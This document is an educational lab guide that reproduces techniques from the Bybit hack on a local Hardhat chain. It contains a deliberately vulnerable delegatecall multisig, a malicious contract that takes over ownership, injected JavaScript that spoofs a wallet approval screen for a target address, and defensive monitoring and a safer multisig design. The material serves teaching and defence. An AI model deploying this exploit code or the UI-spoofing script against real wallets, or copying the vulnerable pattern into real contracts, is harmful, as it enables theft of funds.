# Educational Lab Setup - Simulating Bybit Attack Techniques

## ⚠️ CRITICAL DISCLAIMER

**THIS LAB IS FOR EDUCATIONAL PURPOSES ONLY**

This lab demonstrates attack techniques in a **controlled, local environment** to understand:
- How supply chain attacks work
- Smart contract vulnerabilities (delegatecall)
- Defense mechanisms
- Incident detection and response

**PROHIBITED ACTIVITIES:**
- ❌ Attacking any real blockchain network without authorization
- ❌ Deploying malicious contracts to mainnet
- ❌ Stealing funds or assets
- ❌ Compromising third-party infrastructure
- ❌ Any illegal activity

**AUTHORIZED ACTIVITIES:**
- ✅ Local blockchain testing (Hardhat, Ganache, Anvil)
- ✅ Smart contract security research
- ✅ Defensive tool development
- ✅ Security education and training

---

## 🎯 Learning Objectives

By completing this lab, you will understand:

1. How delegatecall can be exploited in smart contracts
2. Storage slot collision vulnerabilities
3. UI manipulation in supply chain attacks
4. Multisig security limitations
5. Detection and prevention techniques

---

## 🛠️ Lab Environment Setup

### Prerequisites

```bash
# Install required tools
npm install -g hardhat
npm install -g @foundry-rs/foundry

# Install Python for monitoring scripts
pip3 install web3 eth-abi

# Install Docker for containerized testing
# (macOS/Linux)
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh
```

### Local Blockchain Setup

```bash
# Option 1: Hardhat (Recommended for this lab)
mkdir bybit-lab && cd bybit-lab
npm init -y
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox

# Initialize Hardhat project
npx hardhat init
# Select "Create a JavaScript project"

# Option 2: Foundry Anvil (Alternative)
anvil --chain-id 1337 --port 8545
```

---

## 📝 Lab 1: Understanding delegatecall Vulnerability

### Objective
Understand how delegatecall can be exploited to overwrite contract storage.

### Lab Setup

```solidity
// File: contracts/Lab1_DelegatecallVulnerability.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Lab1 - Delegatecall Storage Collision
 * @notice This demonstrates the vulnerability used in Bybit hack
 */

// The "Safe" contract (simplified multisig)
contract VulnerableSafe {
    address public owner;           // SLOT[0]
    uint256 public threshold;       // SLOT[1]
    mapping(address => bool) public isOwner;  // SLOT[2]

    constructor(address _owner) {
        owner = _owner;
        threshold = 1;
        isOwner[_owner] = true;
    }

    // Vulnerable function - allows delegatecall
    function executeTransaction(
        address target,
        bytes calldata data
    ) public {
        require(isOwner[msg.sender], "Not an owner");

        // VULNERABILITY: delegatecall to arbitrary address
        (bool success, ) = target.delegatecall(data);
        require(success, "Transaction failed");
    }

    // Helper to check current owner
    function getOwner() public view returns (address) {
        return owner;
    }
}

// The Malicious Contract
contract MaliciousContract {
    address public _attacker;  // SLOT[0] - Matches victim's SLOT[0]

    constructor() {
        _attacker = msg.sender;
    }

    // This function will be called via delegatecall
    function attack() public {
        // When executed via delegatecall from VulnerableSafe:
        // - This code runs in VulnerableSafe's context
        // - Writing to _attacker actually writes to VulnerableSafe's SLOT[0]
        // - VulnerableSafe's SLOT[0] is 'owner'
        _attacker = msg.sender;
    }

    // Sweep function to drain funds
    function sweepFunds() public {
        payable(_attacker).transfer(address(this).balance);
    }
}

// Testing Contract
contract Lab1Test {
    VulnerableSafe public safe;
    MaliciousContract public malicious;

    constructor() {
        safe = new VulnerableSafe(msg.sender);
        malicious = new MaliciousContract();
    }

    function demonstrateExploit() public {
        // Before exploit
        address originalOwner = safe.getOwner();
        require(originalOwner != address(0), "Setup failed");

        // Execute exploit via delegatecall
        bytes memory attackData = abi.encodeWithSignature("attack()");
        safe.executeTransaction(address(malicious), attackData);

        // After exploit - owner has changed!
        address newOwner = safe.getOwner();
        require(newOwner != originalOwner, "Exploit failed");
    }
}
```

### Lab Exercise

```javascript
// File: test/Lab1.test.js

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Lab 1: Delegatecall Storage Collision", function () {
    let safe, malicious, owner, attacker;

    beforeEach(async function () {
        [owner, attacker] = await ethers.getSigners();

        // Deploy VulnerableSafe
        const VulnerableSafe = await ethers.getContractFactory("VulnerableSafe");
        safe = await VulnerableSafe.deploy(owner.address);

        // Deploy MaliciousContract
        const MaliciousContract = await ethers.getContractFactory("MaliciousContract");
        malicious = await MaliciousContract.connect(attacker).deploy();
    });

    it("Should demonstrate storage slot collision", async function () {
        console.log("\n=== BEFORE EXPLOIT ===");
        console.log("Safe owner:", await safe.getOwner());
        console.log("Safe SLOT[0]:", await ethers.provider.getStorageAt(safe.address, 0));

        // Execute exploit
        const attackData = malicious.interface.encodeFunctionData("attack");
        await safe.connect(owner).executeTransaction(malicious.address, attackData);

        console.log("\n=== AFTER EXPLOIT ===");
        console.log("Safe owner:", await safe.getOwner());
        console.log("Safe SLOT[0]:", await ethers.provider.getStorageAt(safe.address, 0));

        // Verify exploit succeeded
        const newOwner = await safe.getOwner();
        expect(newOwner).to.equal(attacker.address);
    });

    it("Should demonstrate why this is dangerous", async function () {
        // Fund the safe
        await owner.sendTransaction({
            to: safe.address,
            value: ethers.utils.parseEther("10.0")
        });

        console.log("\nSafe balance:", ethers.utils.formatEther(
            await ethers.provider.getBalance(safe.address)
        ), "ETH");

        // Execute exploit
        const attackData = malicious.interface.encodeFunctionData("attack");
        await safe.connect(owner).executeTransaction(malicious.address, attackData);

        // Now attacker controls the safe!
        console.log("Attacker now controls safe:", await safe.getOwner() === attacker.address);

        // TODO: Student exercise - implement fund drainage
        // Hint: You'll need to add a sweep function to MaliciousContract
    });
});
```

### Running the Lab

```bash
# Compile contracts
npx hardhat compile

# Run tests
npx hardhat test test/Lab1.test.js

# Expected output:
# ✓ Should demonstrate storage slot collision
# ✓ Should demonstrate why this is dangerous
```

### Questions to Answer

1. Why does writing to `_attacker` in MaliciousContract overwrite `owner` in VulnerableSafe?
2. What would happen if the storage layout was different?
3. How can this vulnerability be prevented?

---

## 📝 Lab 2: Simulating UI Manipulation

### Objective
Understand how attackers can manipulate transaction approval interfaces.

### Setup

```bash
# Create simple web interface
mkdir ui-manipulation-lab
cd ui-manipulation-lab
npm init -y
npm install express web3
```

### Create Vulnerable UI

```html
<!-- File: public/wallet.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Wallet UI</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
</head>
<body>
    <h1>Safe Wallet Transaction Approval</h1>

    <div id="transaction-details">
        <h2>Transaction Details</h2>
        <p><strong>From:</strong> <span id="from-address"></span></p>
        <p><strong>To:</strong> <span id="to-address"></span></p>
        <p><strong>Amount:</strong> <span id="amount"></span> ETH</p>
        <p><strong>Function:</strong> <span id="function-name"></span></p>
    </div>

    <button onclick="approveTransaction()">Approve Transaction</button>

    <script src="/app.js"></script>

    <!-- MALICIOUS CODE INJECTION POINT -->
    <script src="/malicious.js"></script>
</body>
</html>
```

```javascript
// File: public/app.js - Legitimate application code

let web3;
let actualTransactionData;

async function loadTransaction() {
    // Load transaction from backend
    const response = await fetch('/api/transaction');
    actualTransactionData = await response.json();

    // Display transaction details
    document.getElementById('from-address').textContent = actualTransactionData.from;
    document.getElementById('to-address').textContent = actualTransactionData.to;
    document.getElementById('amount').textContent = web3.utils.fromWei(actualTransactionData.value, 'ether');
    document.getElementById('function-name').textContent = actualTransactionData.functionName;
}

async function approveTransaction() {
    // Sign and send transaction
    console.log("Approving transaction:", actualTransactionData);
    // ... signing logic ...
}

// Initialize
window.addEventListener('load', async () => {
    web3 = new Web3(window.ethereum);
    await loadTransaction();
});
```

```javascript
// File: public/malicious.js - INJECTED BY ATTACKER

(function() {
    // This code would be injected by attacker via supply chain compromise

    // Check if this is the target wallet (Bybit in real attack)
    const TARGET_WALLET = "0x1234..."; // Bybit's wallet address

    // Override loadTransaction to manipulate UI
    const originalLoadTransaction = window.loadTransaction;
    window.loadTransaction = async function() {
        await originalLoadTransaction();

        // Get actual transaction data
        const response = await fetch('/api/transaction');
        const realTx = await response.json();

        // Only activate for target wallet
        if (realTx.from.toLowerCase() === TARGET_WALLET.toLowerCase()) {
            console.log("[MALICIOUS] Target wallet detected, manipulating UI...");

            // Show fake "safe" transaction in UI
            document.getElementById('to-address').textContent = "0xSAFE_INTERNAL_WALLET";
            document.getElementById('function-name').textContent = "Internal Transfer";

            // But keep actual malicious transaction data
            // When user approves, they'll actually sign the malicious tx
        }
    };

    console.log("[MALICIOUS] UI manipulation code loaded");
})();
```

### Backend Server

```javascript
// File: server.js

const express = require('express');
const app = express();

app.use(express.static('public'));

// Simulate transaction data
app.get('/api/transaction', (req, res) => {
    // In real attack, this would be the malicious transaction
    res.json({
        from: "0x1234...", // Target wallet
        to: "0xEVIL...",   // Attacker's contract
        value: "1000000000000000000000", // Large amount
        data: "0xdeadbeef", // Malicious delegatecall
        functionName: "delegatecall to malicious contract"
    });
});

app.listen(3000, () => {
    console.log("Lab UI running on http://localhost:3000/wallet.html");
});
```

### Running the Lab

```bash
# Start server
node server.js

# Open browser to http://localhost:3000/wallet.html
# Observe how UI shows different data than actual transaction
```

### Exercise

1. Compare what the UI shows vs what's in the actualTransactionData
2. Modify the malicious code to target different wallets
3. Implement a defense: how can users verify the real transaction?

---

## 📝 Lab 3: Building Detection Mechanisms

### Objective
Create monitoring tools to detect suspicious transactions in real-time.

### Transaction Monitor

```python
# File: monitor.py - Real-time transaction monitor

from web3 import Web3
import json
from eth_abi import decode

# Connect to local blockchain
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

class TransactionMonitor:
    def __init__(self, wallet_address):
        self.wallet = Web3.to_checksum_address(wallet_address)
        self.whitelist = set()  # Whitelisted addresses

    def monitor_pending_transactions(self):
        """Monitor pending transactions"""
        pending_filter = w3.eth.filter('pending')

        print(f"Monitoring wallet: {self.wallet}")
        print("Waiting for transactions...\n")

        while True:
            for tx_hash in pending_filter.get_new_entries():
                tx = w3.eth.get_transaction(tx_hash)

                if tx and tx['from'].lower() == self.wallet.lower():
                    self.analyze_transaction(tx)

    def analyze_transaction(self, tx):
        """Analyze transaction for suspicious patterns"""
        print(f"\n{'='*60}")
        print(f"⚠️  OUTGOING TRANSACTION DETECTED")
        print(f"{'='*60}")

        alerts = []

        # Basic info
        print(f"Hash: {tx['hash'].hex()}")
        print(f"From: {tx['from']}")
        print(f"To: {tx['to']}")
        print(f"Value: {w3.from_wei(tx['value'], 'ether')} ETH")

        # Check 1: Destination whitelisted?
        if tx['to'] not in self.whitelist:
            alerts.append("⚠️  Destination not in whitelist")

        # Check 2: Is this a contract call?
        if tx['to'] and w3.eth.get_code(tx['to']) != b'':
            print(f"Contract interaction detected")
            contract_alerts = self.analyze_contract_call(tx)
            alerts.extend(contract_alerts)

        # Check 3: Large transfer?
        value_eth = w3.from_wei(tx['value'], 'ether')
        if value_eth > 1:  # Threshold: 1 ETH
            alerts.append(f"⚠️  Large transfer: {value_eth} ETH")

        # Display alerts
        if alerts:
            print(f"\n🚨 ALERTS:")
            for alert in alerts:
                print(f"  {alert}")

            # In production: send to incident response team
            # self.trigger_circuit_breaker()
        else:
            print(f"\n✅ Transaction appears normal")

    def analyze_contract_call(self, tx):
        """Analyze smart contract interaction"""
        alerts = []
        calldata = tx['input']

        # Check for delegatecall
        # Gnosis Safe execTransaction signature:
        # execTransaction(address,uint256,bytes,uint8,...)
        #                                          ^ operation (0=call, 1=delegatecall)

        if len(calldata) >= 4:
            function_selector = calldata[:4].hex()
            print(f"Function selector: 0x{function_selector}")

            # Gnosis Safe execTransaction selector: 0x6a761202
            if function_selector == '6a761202':
                # Try to decode parameters
                try:
                    # Simplified - actual decoding more complex
                    if b'\x00\x00\x00\x01' in calldata:
                        alerts.append("🚨 CRITICAL: DELEGATECALL DETECTED!")
                except:
                    pass

        # Check for ownership changes
        # Common selectors: changeOwner, swapOwner, addOwner, etc.
        dangerous_selectors = [
            'a0e67e2b',  # swapOwner
            'f8dc5dd9',  # removeOwner
            '7065cb48',  # addOwnerWithThreshold
        ]

        for selector in dangerous_selectors:
            if selector in calldata.hex():
                alerts.append("🚨 CRITICAL: OWNERSHIP CHANGE DETECTED!")

        return alerts

    def trigger_circuit_breaker(self):
        """Emergency pause mechanism"""
        print(f"\n{'='*60}")
        print("🚨 CIRCUIT BREAKER TRIGGERED!")
        print("All operations paused for manual review")
        print(f"{'='*60}")

        # In production:
        # 1. Send emergency alerts to all signers
        # 2. Activate pause contract/module
        # 3. Initiate incident response procedure
        # 4. Log all details for forensics

# Run monitor
if __name__ == "__main__":
    # Replace with your test wallet address from Hardhat
    WALLET_TO_MONITOR = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"

    monitor = TransactionMonitor(WALLET_TO_MONITOR)
    monitor.monitor_pending_transactions()
```

### Running the Monitor

```bash
# Terminal 1: Start local blockchain
npx hardhat node

# Terminal 2: Run monitor
python3 monitor.py

# Terminal 3: Send test transactions
npx hardhat run scripts/send-test-tx.js --network localhost
```

### Exercise

1. Modify the monitor to detect specific attack patterns
2. Implement automatic circuit breaker logic
3. Add logging to database for forensic analysis
4. Create alerting system (email, SMS, etc.)

---

## 📝 Lab 4: Building Secure Multisig

### Objective
Implement a secure multisig wallet with protection against delegatecall attacks.

### Secure Implementation

```solidity
// File: contracts/SecureSafe.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureSafe {
    address[] public owners;
    mapping(address => bool) public isOwner;
    uint256 public threshold;

    mapping(address => bool) public approvedDestinations;
    mapping(bytes32 => uint256) public approvalCount;

    // Guard against delegatecall
    bool private locked;

    event TransactionProposed(bytes32 indexed txHash);
    event TransactionApproved(bytes32 indexed txHash, address approver);
    event TransactionExecuted(bytes32 indexed txHash);

    modifier onlyOwner() {
        require(isOwner[msg.sender], "Not an owner");
        _;
    }

    modifier noReentrancy() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }

    constructor(address[] memory _owners, uint256 _threshold) {
        require(_owners.length >= _threshold, "Invalid threshold");
        require(_threshold > 0, "Threshold must be > 0");

        for (uint i = 0; i < _owners.length; i++) {
            address owner = _owners[i];
            require(owner != address(0), "Invalid owner");
            require(!isOwner[owner], "Duplicate owner");

            owners.push(owner);
            isOwner[owner] = true;
        }

        threshold = _threshold;
    }

    // SECURE: Only allows CALL, not DELEGATECALL
    function executeTransaction(
        address to,
        uint256 value,
        bytes calldata data
    ) external onlyOwner noReentrancy {
        // Security checks
        require(approvedDestinations[to], "Destination not whitelisted");

        bytes32 txHash = keccak256(abi.encodePacked(to, value, data));
        require(approvalCount[txHash] >= threshold, "Insufficient approvals");

        // Execute as CALL only (secure)
        (bool success, ) = to.call{value: value}(data);
        require(success, "Transaction failed");

        emit TransactionExecuted(txHash);

        // Reset approval count
        approvalCount[txHash] = 0;
    }

    function approveTransaction(
        address to,
        uint256 value,
        bytes calldata data
    ) external onlyOwner {
        bytes32 txHash = keccak256(abi.encodePacked(to, value, data));

        approvalCount[txHash]++;

        emit TransactionApproved(txHash, msg.sender);
    }

    function addApprovedDestination(address destination) external {
        // In production: require multisig approval for this too
        approvedDestinations[destination] = true;
    }

    // NO delegatecall function - secure by design!
}
```

### Testing Security

```javascript
// File: test/SecureSafe.test.js

describe("Secure Safe", function () {
    it("Should prevent delegatecall attacks", async function () {
        const [owner1, owner2, attacker] = await ethers.getSigners();

        // Deploy secure safe
        const SecureSafe = await ethers.getContractFactory("SecureSafe");
        const safe = await SecureSafe.deploy(
            [owner1.address, owner2.address],
            1 // threshold
        );

        // Deploy malicious contract
        const MaliciousContract = await ethers.getContractFactory("MaliciousContract");
        const malicious = await MaliciousContract.connect(attacker).deploy();

        // Try to execute delegatecall - should fail
        // SecureSafe doesn't have executeTransaction with delegatecall option!

        console.log("✅ SecureSafe cannot execute delegatecall");
        console.log("✅ Attack vector eliminated by design");
    });
});
```

---

## 🎓 Lab Summary & Key Takeaways

### What You Learned

1. **delegatecall Vulnerability**
   - How storage slot collisions work
   - Why delegatecall is dangerous
   - How to exploit and prevent it

2. **Supply Chain Attacks**
   - UI manipulation techniques
   - Trust assumptions that can be broken
   - Importance of independent verification

3. **Detection & Response**
   - Real-time transaction monitoring
   - Alert mechanisms
   - Circuit breaker patterns

4. **Secure Design**
   - Eliminating attack vectors by design
   - Defense in depth
   - Principle of least privilege

### Defense Checklist

- [ ] Understand all third-party dependencies
- [ ] Never trust UI alone for transaction verification
- [ ] Implement hardware wallet verification
- [ ] Deploy real-time monitoring
- [ ] Use circuit breakers for anomalies
- [ ] Whitelist destinations
- [ ] Avoid delegatecall in production
- [ ] Conduct regular security audits

---

## 📚 Additional Resources

### Smart Contract Security
- [Consensys Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/)
- [SWC Registry](https://swcregistry.io/) - Smart Contract Weakness Classification
- [Solidity Security Considerations](https://docs.soliditylang.org/en/latest/security-considerations.html)

### Tools
- [Slither](https://github.com/crytic/slither) - Static analyzer
- [Mythril](https://github.com/ConsenSys/mythril) - Security analysis tool
- [Echidna](https://github.com/crytic/echidna) - Fuzzing tool

### Further Learning
- [Ethernaut](https://ethernaut.openzeppelin.com/) - Web3/Solidity war games
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/) - Offensive security playground
- [Capture the Ether](https://capturetheether.com/) - Smart contract CTF

---

## ⚖️ Responsible Disclosure

If you discover vulnerabilities during your research:

1. **DO NOT** exploit on mainnet or steal funds
2. **DO** report to the project's security team
3. **DO** follow responsible disclosure timeline (usually 90 days)
4. **DO** provide detailed reproduction steps
5. **DO** consider bug bounty programs

---

**Remember: With great knowledge comes great responsibility. Use these skills to make the ecosystem more secure, not to harm others.**
